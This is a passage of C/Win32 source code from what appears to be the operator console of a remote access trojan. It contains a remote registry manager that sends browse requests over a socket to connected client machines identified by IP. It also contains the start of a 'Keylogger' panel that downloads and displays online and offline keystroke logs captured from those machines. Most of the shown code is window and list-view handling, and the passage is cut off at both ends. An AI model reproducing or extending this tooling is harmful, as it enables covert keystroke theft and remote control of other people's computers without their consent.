	item.mask=TVIF_TEXT | LVIF_IMAGE;
	item.iItem=	0;
	item.iImage = 2; 
	item.iSubItem=0;
	item.pszText=Name;
	item.iItem=ListView_InsertItem(GetDlgItem(RegHwnd[ID],IDC_KEYLIST),&item);

	item.iSubItem=1;
	item.pszText="REG_MULTI_SZ";
	ListView_SetItem(GetDlgItem(RegHwnd[ID],IDC_KEYLIST),&item);
		break;
	case REG_NONE:
	item.mask=TVIF_TEXT | LVIF_IMAGE;
	item.iItem=	0;
	item.iImage = 1; 
	item.iSubItem=0;
	item.pszText=Name;
	item.iItem=ListView_InsertItem(GetDlgItem(RegHwnd[ID],IDC_KEYLIST),&item);

	item.iSubItem=1;
	item.pszText="REG_NONE";
	ListView_SetItem(GetDlgItem(RegHwnd[ID],IDC_KEYLIST),&item);
		break;
	case REG_QWORD:
	item.mask=TVIF_TEXT | LVIF_IMAGE;
	item.iItem=	0;
	item.iImage = 1; 
	item.iSubItem=0;
	item.pszText=Name;
	item.iItem=ListView_InsertItem(GetDlgItem(RegHwnd[ID],IDC_KEYLIST),&item);

	item.iSubItem=1;
	item.pszText="REG_QWORD";
	ListView_SetItem(GetDlgItem(RegHwnd[ID],IDC_KEYLIST),&item);
		break;
	case REG_SZ:
	item.mask=TVIF_TEXT | LVIF_IMAGE;
	item.iItem=	0;
	item.iImage = 2; 
	item.iSubItem=0;
	item.pszText=Name;
	item.iItem=ListView_InsertItem(GetDlgItem(RegHwnd[ID],IDC_KEYLIST),&item);

	item.iSubItem=1;
	item.pszText="REG_SZ";
	ListView_SetItem(GetDlgItem(RegHwnd[ID],IDC_KEYLIST),&item);
		break;
	}
	item.iSubItem=2;
	item.pszText=Value;
	ListView_SetItem(GetDlgItem(RegHwnd[ID],IDC_KEYLIST),&item);
/*
	item.iSubItem=2;
	item.pszText=Status;
	ListView_SetItem(GetDlgItem(ServiceHwnd[ID],IDC_SERVICES),&item);

	item.iSubItem=3;
	item.pszText=StartUp;
	ListView_SetItem(GetDlgItem(ServiceHwnd[ID],IDC_SERVICES),&item);*/
return 0;
}
int GetParentDir(HWND hwnd, HTREEITEM hitem, char * Buf)
{
char A [1024] = "";
char B [1024] = "";
char C [1024] = "";
int BA = 0;
HTREEITEM hitemA;
HTREEITEM hitemB;
//////////////////////////////////////////
					strcpy(B, C);
					strcpy(C, Buf);
					strcat(C, "\\");
					strcat(C, B);
					//MessageBox(NULL, C, "C", MB_OK);
					
//////////////////////////////////////////
hitemA = TreeView_GetParent(GetDlgItem(hwnd, IDC_REGFOLDERS), hitem);
     
			    TreeView_EnsureVisible(hwnd,hitemA);
			    SendDlgItemMessage(hwnd,IDC_REGFOLDERS,TVM_SELECTITEM,TVGN_CARET,(LPARAM)hitemA);
				flagSelected=true;
	            tvi.mask=TVIF_TEXT;
				tvi.pszText=A;
				tvi.cchTextMax=256;
				tvi.hItem=hitemA;

					if(SendDlgItemMessage(hwnd,IDC_REGFOLDERS,TVM_GETITEM,TVGN_CARET,(LPARAM)&tvi))
					{
					//MessageBox(NULL, A, "A", MB_OK);
					
					if(strstr(A, "HKEY_CLASSES_ROOT"))
					{
						strcpy(Head.Data, C);
						Head.PacketType = PACKET_REG_MANAGER;
						Head.ID2 = 0;
						//MessageBox(NULL, C, "C", MB_OK);
						SentKb+=send(Client[Head.ID],(char *)&Head, sizeof(PACKETHEAD), 0);
						return 0;
					}
					if(strstr(A, "HKEY_CURRENT_USER"))
					{
						strcpy(Head.Data, C);
						Head.PacketType = PACKET_REG_MANAGER;
						Head.ID2 = 1;
						//MessageBox(NULL, C, "C", MB_OK);
						SentKb+=send(Client[Head.ID],(char *)&Head, sizeof(PACKETHEAD), 0);
						return 0;
					}
					if(strstr(A, "HKEY_LOCAL_MACHINE"))
					{
						strcpy(Head.Data, C);
						Head.PacketType = PACKET_REG_MANAGER;
						Head.ID2 = 2;
						//MessageBox(NULL, C, "C", MB_OK);
						SentKb+=send(Client[Head.ID],(char *)&Head, sizeof(PACKETHEAD), 0);
						return 0;
					}
					if(strstr(A, "HKEY_USERS"))
					{
						strcpy(Head.Data, C);
						Head.PacketType = PACKET_REG_MANAGER;
						Head.ID2 = 3;
						//MessageBox(NULL, C, "C", MB_OK);
						SentKb+=send(Client[Head.ID],(char *)&Head, sizeof(PACKETHEAD), 0);
						return 0;
					}
					if(strstr(A, "HKEY_CURRENT_CONFIG"))
					{
						strcpy(Head.Data, C);
						Head.ID2 = 4;
						Head.PacketType = PACKET_REG_MANAGER;
						//MessageBox(NULL, C, "C", MB_OK);
						SentKb+=send(Client[Head.ID],(char *)&Head, sizeof(PACKETHEAD), 0);
						return 0;
					}
					strcpy(B, C);
					strcpy(C, A);
					strcat(C, "\\");
					strcat(C, B);
				//	MessageBox(NULL, C, "C", MB_OK);
					}
while(1)
{
switch(BA)
	{
	case 0:
		hitemB = TreeView_GetParent(GetDlgItem(hwnd, IDC_REGFOLDERS), hitemA);
     
			    TreeView_EnsureVisible(hwnd,hitemB);
			    SendDlgItemMessage(hwnd,IDC_REGFOLDERS,TVM_SELECTITEM,TVGN_CARET,(LPARAM)hitemB);
				flagSelected=true;
	            tvi.mask=TVIF_TEXT;
				tvi.pszText=A;
				tvi.cchTextMax=256;
				tvi.hItem=hitemB;
				if(SendDlgItemMessage(hwnd,IDC_REGFOLDERS,TVM_GETITEM,TVGN_CARET,(LPARAM)&tvi))
					{

					if(strstr(A, "HKEY_CLASSES_ROOT"))
					{
						strcpy(Head.Data, C);
						Head.PacketType = PACKET_REG_MANAGER;
						Head.ID2 = 0;
						//MessageBox(NULL, C, "C", MB_OK);
						SentKb+=send(Client[Head.ID],(char *)&Head, sizeof(PACKETHEAD), 0);
						return 0;
					}
					if(strstr(A, "HKEY_CURRENT_USER"))
					{
						strcpy(Head.Data, C);
						Head.PacketType = PACKET_REG_MANAGER;
						Head.ID2 = 1;
						//MessageBox(NULL, C, "C", MB_OK);
						SentKb+=send(Client[Head.ID],(char *)&Head, sizeof(PACKETHEAD), 0);
						return 0;
					}
					if(strstr(A, "HKEY_LOCAL_MACHINE"))
					{
						strcpy(Head.Data, C);
						Head.PacketType = PACKET_REG_MANAGER;
						Head.ID2 = 2;
						//MessageBox(NULL, C, "C", MB_OK);
						SentKb+=send(Client[Head.ID],(char *)&Head, sizeof(PACKETHEAD), 0);
						return 0;
					}
					if(strstr(A, "HKEY_USERS"))
					{
						strcpy(Head.Data, C);
						Head.PacketType = PACKET_REG_MANAGER;
						Head.ID2 = 3;
						//MessageBox(NULL, C, "C", MB_OK);
						SentKb+=send(Client[Head.ID],(char *)&Head, sizeof(PACKETHEAD), 0);
						return 0;
					}
					if(strstr(A, "HKEY_CURRENT_CONFIG"))
					{
						strcpy(Head.Data, C);
						Head.ID2 = 4;
						Head.PacketType = PACKET_REG_MANAGER;
						//MessageBox(NULL, C, "C", MB_OK);
						SentKb+=send(Client[Head.ID],(char *)&Head, sizeof(PACKETHEAD), 0);
						return 0;
					}
					strcpy(B, C);
					strcpy(C, A);
					strcat(C, "\\");
					strcat(C, B);
					
					}
				//MessageBox(NULL, C, "C", MB_OK);
					
					BA = 1;
		break;

	case 1:
				hitemA = TreeView_GetParent(GetDlgItem(hwnd, IDC_REGFOLDERS), hitemB);
     
			    TreeView_EnsureVisible(hwnd,hitemA);
			    SendDlgItemMessage(hwnd,IDC_REGFOLDERS,TVM_SELECTITEM,TVGN_CARET,(LPARAM)hitemA);
				flagSelected=true;
	            tvi.mask=TVIF_TEXT;
				tvi.pszText=A;
				tvi.cchTextMax=256;
				tvi.hItem=hitemA;

					if(SendDlgItemMessage(hwnd,IDC_REGFOLDERS,TVM_GETITEM,TVGN_CARET,(LPARAM)&tvi))
					{
					
					if(strstr(A, "HKEY_CLASSES_ROOT"))
					{
						strcpy(Head.Data, C);
						Head.PacketType = PACKET_REG_MANAGER;
						Head.ID2 = 0;
						//MessageBox(NULL, C, "C", MB_OK);
						SentKb+=send(Client[Head.ID],(char *)&Head, sizeof(PACKETHEAD), 0);
						return 0;
					}
					if(strstr(A, "HKEY_CURRENT_USER"))
					{
						strcpy(Head.Data, C);
						Head.PacketType = PACKET_REG_MANAGER;
						Head.ID2 = 1;
						//MessageBox(NULL, C, "C", MB_OK);
						SentKb+=send(Client[Head.ID],(char *)&Head, sizeof(PACKETHEAD), 0);
						return 0;
					}
					if(strstr(A, "HKEY_LOCAL_MACHINE"))
					{
						strcpy(Head.Data, C);
						Head.PacketType = PACKET_REG_MANAGER;
						Head.ID2 = 2;
						//MessageBox(NULL, C, "C", MB_OK);
						SentKb+=send(Client[Head.ID],(char *)&Head, sizeof(PACKETHEAD), 0);
						return 0;
					}
					if(strstr(A, "HKEY_USERS"))
					{
						strcpy(Head.Data, C);
						Head.PacketType = PACKET_REG_MANAGER;
						Head.ID2 = 3;
						//MessageBox(NULL, C, "C", MB_OK);
						SentKb+=send(Client[Head.ID],(char *)&Head, sizeof(PACKETHEAD), 0);
						return 0;
					}
					if(strstr(A, "HKEY_CURRENT_CONFIG"))
					{
						strcpy(Head.Data, C);
						Head.ID2 = 4;
						Head.PacketType = PACKET_REG_MANAGER;
						//MessageBox(NULL, C, "C", MB_OK);
						SentKb+=send(Client[Head.ID],(char *)&Head, sizeof(PACKETHEAD), 0);
						return 0;
					}
					strcpy(B, C);
					strcpy(C, A);
					strcat(C, "\\");
					strcat(C, B);
										
					}
					BA = 0;
		break;
	}
	
}

return 0;
}
int SetReg(HWND hWnd)
{
RECT rc;    // client area  
GetClientRect(hWnd, &rc);

MoveWindow(GetDlgItem(hWnd, IDC_KEYLIST),(rc.right / 3) + 5,0,(rc.right - (rc.right / 3)) - 5, rc.bottom, TRUE);
MoveWindow(GetDlgItem(hWnd, IDC_REGFOLDERS),0,0,rc.right / 3, rc.bottom , TRUE);

return 1;
}
LRESULT CALLBACK RegProc(HWND hwnd,UINT message,WPARAM wParam,LPARAM lParam)
{
	int Select;
	char WindowOut  [10] = "";
	char WindowOutY [10] = "";
	char Title [50] = "";
	int FG = 0;
	LV_COLUMN	col;
//	LV_ITEM		item;
//	RECT rc;
	HICON RegIcon;

	switch(message)
	{
////////////////////////////////////////////////////////////////////////////////
	case WM_INITDIALOG:
		RegImageList=ImageList_Create(16,16,ILC_COLOR16,20,30);
		ImageList_SetBkColor(RegImageList,CLR_NONE);// Macro: 16x16:16bit with 2 pics [array]
		RegIcon=(HICON)LoadImage(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_FOLDER), IMAGE_ICON, 16, 16, 0);				  // load the picture from the resource
		ImageList_AddIcon(RegImageList, RegIcon);

		RegIcon=(HICON)LoadImage(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_DWORD), IMAGE_ICON, 16, 16, 1);				  // load the picture from the resource
		ImageList_AddIcon(RegImageList, RegIcon);

		RegIcon=(HICON)LoadImage(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_STRING), IMAGE_ICON, 16, 16, 2);				  // load the picture from the resource
		ImageList_AddIcon(RegImageList, RegIcon);

		ListView_SetImageList(GetDlgItem(hwnd, IDC_KEYLIST),RegImageList, LVSIL_SMALL);
		SendDlgItemMessage(hwnd,IDC_REGFOLDERS,TVM_SETIMAGELIST,0,(LPARAM)RegImageList); // put it onto the tree control
		
			tvinsert.hParent=NULL;			// top most level no need handle
			tvinsert.hInsertAfter=TVI_ROOT; // work as root level
            tvinsert.item.mask=TVIF_TEXT|TVIF_IMAGE|TVIF_SELECTEDIMAGE;
	        tvinsert.item.pszText="HKEY_CLASSES_ROOT";
			tvinsert.item.iImage=0;
			tvinsert.item.iSelectedImage=0;
			RParent=(HTREEITEM)SendDlgItemMessage(hwnd,IDC_REGFOLDERS,TVM_INSERTITEM,0,(LPARAM)&tvinsert);

			tvinsert.hParent=NULL;			// top most level no need handle
			tvinsert.hInsertAfter=TVI_ROOT; // work as root level
            tvinsert.item.mask=TVIF_TEXT|TVIF_IMAGE|TVIF_SELECTEDIMAGE;
	        tvinsert.item.pszText="HKEY_CURRENT_USER";
			tvinsert.item.iImage=0;
			tvinsert.item.iSelectedImage=0;
			RParent=(HTREEITEM)SendDlgItemMessage(hwnd,IDC_REGFOLDERS,TVM_INSERTITEM,0,(LPARAM)&tvinsert);


			tvinsert.hParent=NULL;			// top most level no need handle
			tvinsert.hInsertAfter=TVI_ROOT; // work as root level
            tvinsert.item.mask=TVIF_TEXT|TVIF_IMAGE|TVIF_SELECTEDIMAGE;
	        tvinsert.item.pszText="HKEY_LOCAL_MACHINE";
			tvinsert.item.iImage=0;
			tvinsert.item.iSelectedImage=0;
			RParent=(HTREEITEM)SendDlgItemMessage(hwnd,IDC_REGFOLDERS,TVM_INSERTITEM,0,(LPARAM)&tvinsert);
			
			tvinsert.hParent=NULL;			// top most level no need handle
			tvinsert.hInsertAfter=TVI_ROOT; // work as root level
            tvinsert.item.mask=TVIF_TEXT|TVIF_IMAGE|TVIF_SELECTEDIMAGE;
	        tvinsert.item.pszText="HKEY_USERS";
			tvinsert.item.iImage=0;
			tvinsert.item.iSelectedImage=0;
			RParent=(HTREEITEM)SendDlgItemMessage(hwnd,IDC_REGFOLDERS,TVM_INSERTITEM,0,(LPARAM)&tvinsert);

			tvinsert.hParent=NULL;			// top most level no need handle
			tvinsert.hInsertAfter=TVI_ROOT; // work as root level
            tvinsert.item.mask=TVIF_TEXT|TVIF_IMAGE|TVIF_SELECTEDIMAGE;
	        tvinsert.item.pszText="HKEY_CURRENT_CONFIG";
			tvinsert.item.iImage=0;
			tvinsert.item.iSelectedImage=0;
			RParent=(HTREEITEM)SendDlgItemMessage(hwnd,IDC_REGFOLDERS,TVM_INSERTITEM,0,(LPARAM)&tvinsert);

		ListView_SetExtendedListViewStyle(GetDlgItem(hwnd,IDC_KEYLIST),LVS_EX_FULLROWSELECT |LVS_EX_GRIDLINES);
		col.mask=LVCF_TEXT|LVCF_WIDTH|LVIF_IMAGE;	
		col.cx=100;
		col.fmt = LVCFMT_IMAGE;

		col.pszText="Name";
		ListView_InsertColumn(GetDlgItem(hwnd,IDC_KEYLIST),0,&col);
		col.cx=100;

		col.pszText="Type";
		ListView_InsertColumn(GetDlgItem(hwnd,IDC_KEYLIST),1,&col);
		col.cx=100;

		col.pszText="Data";
		ListView_InsertColumn(GetDlgItem(hwnd,IDC_KEYLIST),2,&col);
		col.cx=100;
			SetReg(hwnd);
//////////////////////////////////////////////////////////////////////

	break;
		case WM_SIZING:
			switch(wParam)
			{
			case WMSZ_BOTTOM:
			SetReg(hwnd);
			break;
			case WMSZ_BOTTOMLEFT:
			SetReg(hwnd);
			break;
			case WMSZ_BOTTOMRIGHT:
			SetReg(hwnd);
			break;
			case WMSZ_LEFT:
			SetReg(hwnd);
            break;
			case WMSZ_RIGHT:
			SetReg(hwnd);
			break;
			case WMSZ_TOP:
			SetReg(hwnd);
			break;
			case WMSZ_TOPLEFT:
			SetReg(hwnd);
			break;
			case WMSZ_TOPRIGHT:
			SetReg(hwnd);
			break;
			}
			break;
		case WM_NOTIFY:
		{
		    case IDC_TREE1:
            
			if(((LPNMHDR)lParam)->code == NM_DBLCLK) // if code == NM_CLICK - Single click on an item
			{
				char Text[255]="";
				memset(&tvi,0,sizeof(tvi));
					GetWindowText(GetDlgItem(hwnd, IDC_ID), WindowOut, 10);
			        Head.ID = atoi(WindowOut);
					//MessageBox(NULL, Text, Text, MB_OK);
				RSelected[Head.ID] = NULL;
				RSelected[Head.ID]=(HTREEITEM)SendDlgItemMessage(hwnd,IDC_REGFOLDERS,TVM_GETNEXTITEM,TVGN_CARET,(LPARAM)RSelected[Head.ID]);
				
				if(RSelected[Head.ID]==NULL)
				{
					break;
				}
				ResetProcs(hwnd, IDC_KEYLIST);
				TreeView_EnsureVisible(hwnd,RSelected[Head.ID]);
			    SendDlgItemMessage(hwnd,IDC_REGFOLDERS,TVM_SELECTITEM,TVGN_CARET,(LPARAM)RSelected[Head.ID]);
				flagSelected=true;
	            tvi.mask=TVIF_TEXT;
				tvi.pszText=Text;
				tvi.cchTextMax=256;
				tvi.hItem=RSelected[Head.ID];

					if(SendDlgItemMessage(hwnd,IDC_REGFOLDERS,TVM_GETITEM,TVGN_CARET,(LPARAM)&tvi))
					{
				
						
					if(strstr(Text, "HKEY_CLASSES_ROOT"))
					{
					DeleteChild(hwnd, IDC_REGFOLDERS,RSelected[Head.ID]);
						strcpy(Head.Data, "");
						Head.PacketType = PACKET_REG_MANAGER;
						Head.ID2 = 0;
						SentKb+=send(Client[Head.ID],(char *)&Head, sizeof(PACKETHEAD), 0);
						break;
					}
					if(strstr(Text, "HKEY_CURRENT_USER"))
					{

					DeleteChild(hwnd, IDC_REGFOLDERS,RSelected[Head.ID]);
						strcpy(Head.Data, "");
						Head.PacketType = PACKET_REG_MANAGER;
						Head.ID2 = 1;
						SentKb+=send(Client[Head.ID],(char *)&Head, sizeof(PACKETHEAD), 0);
						break;
					}
					if(strstr(Text, "HKEY_LOCAL_MACHINE"))
					{
											DeleteChild(hwnd, IDC_REGFOLDERS,RSelected[Head.ID]);
						strcpy(Head.Data, "");
						Head.PacketType = PACKET_REG_MANAGER;
						Head.ID2 = 2;
						SentKb+=send(Client[Head.ID],(char *)&Head, sizeof(PACKETHEAD), 0);
						break;
					}
					if(strstr(Text, "HKEY_USERS"))
					{
					DeleteChild(hwnd, IDC_REGFOLDERS,RSelected[Head.ID]);
					strcpy(Head.Data, "");
						Head.PacketType = PACKET_REG_MANAGER;
						Head.ID2 = 3;
						
						SentKb+=send(Client[Head.ID],(char *)&Head, sizeof(PACKETHEAD), 0);
						break;
					}
					if(strstr(Text, "HKEY_CURRENT_CONFIG"))
					{
					DeleteChild(hwnd, IDC_REGFOLDERS,RSelected[Head.ID]);
						strcpy(Head.Data, "");
						Head.ID2 = 4;
						Head.PacketType = PACKET_REG_MANAGER;
						SentKb+=send(Client[Head.ID],(char *)&Head, sizeof(PACKETHEAD), 0);
						break;
					}

				//	MessageBox(NULL, Text, Text, MB_OK);
					DeleteChild(hwnd, IDC_REGFOLDERS,RSelected[Head.ID]);
					GetParentDir(hwnd, RSelected[Head.ID], Text);
					  break;
					}
				
			}

			if(((LPNMHDR)lParam)->code == NM_RCLICK) // Right Click
			{
			/*elected=(HTREEITEM)SendDlgItemMessage (hwnd,IDC_REGFOLDERS,TVM_GETNEXTITEM,TVGN_DROPHILITE,0);
				if(Selected==NULL)
				{
					MessageBox(hwnd,"No Items in TreeView","Error",MB_OK|MB_ICONINFORMATION);
					break;
				}
				
				SendDlgItemMessage(hwnd,IDC_REGFOLDERS,TVM_SELECTITEM,TVGN_CARET,(LPARAM)RSelected);
				SendDlgItemMessage(hwnd,IDC_REGFOLDERS,TVM_SELECTITEM,TVGN_DROPHILITE,(LPARAM)RSelected);
				TreeView_EnsureVisible(hTree,Selected);*/
			}	
		}
		break;

	/*	case WM_SIZING:
			switch(wParam)
			{
			case WMSZ_BOTTOM:
			 GetClientRect(hwnd, &rc);
			 MoveWindow(GetDlgItem(hwnd, IDC_SERVICES),0,0,rc.right, rc.bottom, TRUE);
			break;

			case WMSZ_BOTTOMLEFT:
			 GetClientRect(hwnd, &rc);
			 MoveWindow(GetDlgItem(hwnd, IDC_SERVICES),0,0,rc.right, rc.bottom, TRUE);			 
			break;

			case WMSZ_BOTTOMRIGHT:
			 GetClientRect(hwnd, &rc);
			 MoveWindow(GetDlgItem(hwnd, IDC_SERVICES),0,0,rc.right, rc.bottom, TRUE);			 
			break;

			case WMSZ_LEFT:
			 GetClientRect(hwnd, &rc);
			 MoveWindow(GetDlgItem(hwnd, IDC_SERVICES),0,0,rc.right, rc.bottom, TRUE);			 
            break;

			case WMSZ_RIGHT:
             GetClientRect(hwnd, &rc);
			 MoveWindow(GetDlgItem(hwnd, IDC_SERVICES),0,0,rc.right, rc.bottom, TRUE);			 
			break;

			case WMSZ_TOP:
			 GetClientRect(hwnd, &rc);
			 MoveWindow(GetDlgItem(hwnd, IDC_SERVICES),0,0,rc.right, rc.bottom, TRUE);			 
			break;
			case WMSZ_TOPLEFT:
			 GetClientRect(hwnd, &rc);
			 MoveWindow(GetDlgItem(hwnd, IDC_SERVICES),0,0,rc.right, rc.bottom, TRUE);	
			break;

			case WMSZ_TOPRIGHT:
			 GetClientRect(hwnd, &rc);
			 MoveWindow(GetDlgItem(hwnd, IDC_SERVICES),0,0,rc.right, rc.bottom, TRUE);			 
			break;
			}
			break;*/
	case WM_COMMAND:
		Select=LOWORD(wParam);
		switch(Select)
		{
		case IDCANCEL:
					GetWindowText(GetDlgItem(hwnd, IDC_ID), WindowOut, 10);
			        Head.ID = atoi(WindowOut);
					RegHwnd[Head.ID] = NULL;
					EndDialog(hwnd,Select);
					break;
		}

//////////////////////////////////////////////////////////////////////////////// 
	default:
		return FALSE;
	}
return TRUE;
}
DWORD WINAPI RegisteryWindow(LPVOID lpParam)
{
	FileStruct * FILEWINDOW = (FileStruct *)lpParam;
	char WindowText [50] = "";
	char COMPUTER [50] = "";
	int LID = GID;
	char IDA [10] = "";
	HICON hIcon;

	strcpy(COMPUTER, WINDOWIP);

	RegHwnd[LID]=CreateDialog(RegInst,(LPCTSTR)IDD_REGISTERYMAN,NULL,(DLGPROC)RegProc);
	ShowWindow(RegHwnd[LID],SW_SHOW);
	ShowWindow(GetDlgItem(RegHwnd[LID], IDC_ID),SW_HIDE);
	InitCommonControls();

	ZeroMemory(&WindowText[0],10);
	sprintf(&WindowText[0],"Registry Manager | %s", COMPUTER);
	sprintf(IDA, "%d", LID);
	
	SetWindowText(RegHwnd[LID], WindowText);
	SetWindowText(GetDlgItem(RegHwnd[LID], IDC_ID), IDA);

	MSG msg;

	hIcon=(HICON)LoadImage(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_ARYAN), IMAGE_ICON, 16, 16, 0);
	SendMessage(RegHwnd[LID], WM_SETICON,ICON_SMALL,(LPARAM)hIcon);
	DeleteObject(hIcon);
	hIcon=(HICON)LoadImage(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_ARYAN), IMAGE_ICON, 32, 32, 0);
	SendMessage(RegHwnd[LID], WM_SETICON,ICON_BIG,(LPARAM)hIcon);
	while(GetMessage(&msg,RegHwnd[LID],0,0)==TRUE)
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
return 0;
}
/////////////////////////////////////////////////////////////////////////////////////////////////
//Keylogger
 

LRESULT CALLBACK KeyLogProc(HWND hwnd,UINT message,WPARAM wParam,LPARAM lParam)
{
	int Select;
//	HWND hEdit;
//	int  ndx;
	char WindowOut  [10] = "";
	char WindowOutY [10] = "";                                     //  Current text color
//    HANDLE hRichEdit;
//	POINT  pt;   // location of mouse click 
//    HMENU hmenu;
//	HMENU hmenuTrackPopup;
	LPSTR pszFileText;
   CHOOSECOLOR cc;
   CHARFORMAT cf;
   DWORD dwColors[ 16 ];
   HANDLE FileHandle;
   DWORD numb_bytes;
   DWORD dwFileSize;
   RECT rc;
   TCITEM tie;

   char FileNameA[30] = "Logs";
   int I = 0;
	switch(message)
	{
////////////////////////////////////////////////////////////////////////////////
	case WM_INITDIALOG:
	SendDlgItemMessage( hwnd, IDC_KEYS, EM_SETBKGNDCOLOR, FALSE, dwBackColor );


	CreateWindowEx(0, STATUSCLASSNAME, NULL,WS_CHILD | WS_VISIBLE | SBARS_SIZEGRIP, 0, 0, 0, 0,hwnd, (HMENU)IDC_TASK_STATUS , GetModuleHandle(NULL), NULL);
	SendMessage(GetDlgItem(hwnd,IDC_TASK_STATUS), SB_SETTEXT, 0, (LPARAM)"Downloading logs...");	
    GetClientRect(hwnd, &rc);

    tie.mask = TCIF_TEXT | TCIF_IMAGE;  
    tie.pszText = "Online logs";
	
	TabCtrl_InsertItem(GetDlgItem(hwnd, IDC_TAB2), 0, &tie);

	tie.mask = TCIF_TEXT | TCIF_IMAGE;  
    tie.pszText = "OffLine log's";
	
	TabCtrl_InsertItem(GetDlgItem(hwnd, IDC_TAB2), 1, &tie);

		 ShowWindow(GetDlgItem( hwnd, IDC_KEYS2 ),SW_HIDE);
		 MoveWindow(GetDlgItem(hwnd, IDC_KEYS),0,0,rc.right, rc.bottom - 40, TRUE);
		 MoveWindow(GetDlgItem(hwnd, IDC_KEYS2),0,0,rc.right, rc.bottom - 40, TRUE);
		 MoveWindow(GetDlgItem(hwnd, IDC_PROGRESS),0,rc.bottom - 15,rc.right, 10, TRUE);
		 MoveWindow(GetDlgItem(hwnd, IDC_TAB2),0,0,rc.right, rc.bottom - 20, TRUE);
         if(GetDlgItem( hwnd, IDC_KEYS ))                         //  Sanity Check
         {
            memset( &cf, 0, sizeof(CHARFORMAT) );      //  Initialize structure

            cf.cbSize = sizeof(CHARFORMAT);             //  Initialize RichEdit
            cf.dwMask = CFM_COLOR | CFM_FACE | CFM_SIZE;  //  control structure
            cf.crTextColor = dwTextColor;
            cf.yHeight = 32;
            strcpy( cf.szFaceName, "MS Sans Serif" );
                              //  Set character formatting and background color
            SendDlgItemMessage( hwnd, IDC_KEYS, EM_SETCHARFORMAT, 4, (LPARAM)&cf );
            //SendDlgItemMessage( hwnd, IDC_KEYS, EM_SETBKGNDCOLOR, FALSE, 0 );
         }
		
         return( TRUE );
/////////////////////////////////////////////////////////////
	break;
    case WM_NOTIFY:
	switch(wParam)
	{

	case IDC_TAB2:
            switch (((LPNMHDR)lParam)->code)
            {
            case TCN_SELCHANGE:
                    int iPage = TabCtrl_GetCurSel(GetDlgItem(hwnd, IDC_TAB2)); 
                    if(iPage != 0)
					{
					 GetClientRect(hwnd, &rc);
					 ShowWindow(GetDlgItem( hwnd, IDC_KEYS ),SW_HIDE);
					 ShowWindow(GetDlgItem( hwnd, IDC_KEYS2 ),SW_SHOW);
					 MoveWindow(GetDlgItem(hwnd, IDC_KEYS2),0,0,rc.right, rc.bottom - 40, TRUE);
					}
					else
					{
					 GetClientRect(hwnd, &rc);
					 ShowWindow(GetDlgItem( hwnd, IDC_KEYS2 ),SW_HIDE);
					 ShowWindow(GetDlgItem( hwnd, IDC_KEYS ),SW_SHOW);
					 MoveWindow(GetDlgItem(hwnd, IDC_KEYS),0,0,rc.right, rc.bottom - 40, TRUE);
					}
				
				break;
            }
		break;
	}
	break;
	case WM_SIZING:
			switch(wParam)
			{
			case WMSZ_BOTTOM:
			 GetClientRect(hwnd, &rc);
			 MoveWindow(GetDlgItem(hwnd, IDC_KEYS),0,0,rc.right, rc.bottom - 40, TRUE);
			 MoveWindow(GetDlgItem(hwnd, IDC_KEYS2),0,0,rc.right, rc.bottom - 40, TRUE);
			 MoveWindow(GetDlgItem(hwnd, IDC_TASK_STATUS),0,rc.bottom - 10,rc.right, 10, TRUE);
			 MoveWindow(GetDlgItem(hwnd, IDC_TAB2),0,0,rc.right, rc.bottom - 20, TRUE);
			 //MoveWindow(hStatus,0,rc.bottom - 20,rc.right, 20, TRUE);
			break;
			case WMSZ_BOTTOMLEFT:
			 GetClientRect(hwnd, &rc);
			 MoveWindow(GetDlgItem(hwnd, IDC_KEYS),0,0,rc.right, rc.bottom - 40, TRUE);
			 MoveWindow(GetDlgItem(hwnd, IDC_KEYS2),0,0,rc.right, rc.bottom - 40, TRUE);
			 MoveWindow(GetDlgItem(hwnd, IDC_TASK_STATUS),0,rc.bottom - 10,rc.right, 10, TRUE);
			 MoveWindow(GetDlgItem(hwnd, IDC_TAB2),0,0,rc.right, rc.bottom - 20, TRUE);
			 //MoveWindow(hStatus,0,rc.bottom - 20,rc.right, 20, TRUE);
			break;
			case WMSZ_BOTTOMRIGHT:
			 GetClientRect(hwnd, &rc);
			 MoveWindow(GetDlgItem(hwnd, IDC_KEYS),0,0,rc.right, rc.bottom - 40, TRUE);
			 MoveWindow(GetDlgItem(hwnd, IDC_KEYS2),0,0,rc.right, rc.bottom - 40, TRUE);
			 MoveWindow(GetDlgItem(hwnd, IDC_TASK_STATUS),0,rc.bottom - 10,rc.right, 10, TRUE);
			 MoveWindow(GetDlgItem(hwnd, IDC_TAB2),0,0,rc.right, rc.bottom - 20, TRUE);

			 //MoveWindow(hStatus,0,rc.bottom - 20,rc.right, 20, TRUE);
			break;
			case WMSZ_LEFT:
			 GetClientRect(hwnd, &rc);
			 MoveWindow(GetDlgItem(hwnd, IDC_KEYS),0,0,rc.right, rc.bottom - 40, TRUE);
			 MoveWindow(GetDlgItem(hwnd, IDC_KEYS2),0,0,rc.right, rc.bottom - 40, TRUE);
			 MoveWindow(GetDlgItem(hwnd, IDC_TASK_STATUS),0,rc.bottom - 10,rc.right, 10, TRUE);
			 MoveWindow(GetDlgItem(hwnd, IDC_TAB2),0,0,rc.right, rc.bottom - 20, TRUE);

			 //MoveWindow(hStatus,0,rc.bottom - 20,rc.right, 20, TRUE);
            break;
			case WMSZ_RIGHT:
			 GetClientRect(hwnd, &rc);
			 MoveWindow(GetDlgItem(hwnd, IDC_KEYS),0,0,rc.right, rc.bottom - 40, TRUE);
			 MoveWindow(GetDlgItem(hwnd, IDC_KEYS2),0,0,rc.right, rc.bottom - 40, TRUE);
			 MoveWindow(GetDlgItem(hwnd, IDC_TASK_STATUS),0,rc.bottom - 10,rc.right, 10, TRUE);
			 MoveWindow(GetDlgItem(hwnd, IDC_TAB2),0,0,rc.right, rc.bottom - 20, TRUE);

			 //MoveWindow(hStatus,0,rc.bottom - 20,rc.right, 20, TRUE);
			break;
			case WMSZ_TOP:
			 GetClientRect(hwnd, &rc);
			 MoveWindow(GetDlgItem(hwnd, IDC_KEYS),0,0,rc.right, rc.bottom - 40, TRUE);
			 MoveWindow(GetDlgItem(hwnd, IDC_KEYS2),0,0,rc.right, rc.bottom - 40, TRUE);
			 MoveWindow(GetDlgItem(hwnd, IDC_TASK_STATUS),0,rc.bottom - 10,rc.right, 10, TRUE);
